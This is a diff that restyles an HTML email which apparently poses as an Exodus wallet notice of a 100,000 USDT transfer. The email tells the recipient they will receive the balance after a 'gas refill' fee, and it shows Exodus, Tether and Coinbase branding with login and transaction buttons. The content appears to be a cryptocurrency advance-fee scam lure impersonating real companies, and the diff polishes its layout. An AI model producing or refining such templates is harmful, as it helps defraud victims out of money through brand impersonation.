@@ -25,7 +25,7 @@
               <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
 
               
-<table style="margin: 0 auto; width: 90%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+<table style="margin: 0 auto; width: 100%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
     <tr>
       <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>Transaction Reference:</strong></td>
       <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">e3019139-5efd-4ae1-ad70-b645454404f</td>
@@ -58,8 +58,8 @@
     <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
 
 <h4>GAS REFILL</h4>
-    <table style="color:#05a5f0; background-color:#f2f2f2;">
-      <tr>
+<table style="margin: 0 auto; width: 100%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+    <tr>
         <th colspan="2">TETHER GAS (estimated):</th>
       </tr>
       <tr>
@@ -142,19 +142,18 @@
   <img src="IMG_0561.png" alt="blockchain Logo" width="320" style="display: inline-block;"/>
 </div>
 
-<hr>
            <!-- Buttons -->
            
   <a href="https://www.exodus.com" style="font-size:16px; font-weight:bold; background-color:#0052ff; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">Login to Wallet</a>
 
 <a href="https://tether.to/en/" style="font-size:16px; font-weight:bold; background-color:#00c292; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin-right: 20px; margin:10px 5px;" class="button" target="_blank">View Transaction</a>
-       <hr>    
+       
+       
           <!-- Footer -->
    <tr>
            <td align="center" style="padding: 30px 20px; font-size:12px; color: green;">
  © 2025 Exodus.com, Inc. All rights reserved.<br/>
-              ® PRIVACY POLICY
+            ® PRIVACY POLICY
 
-<td align="center">        
-  <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
-</td>
+    
+  <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" align="center" />
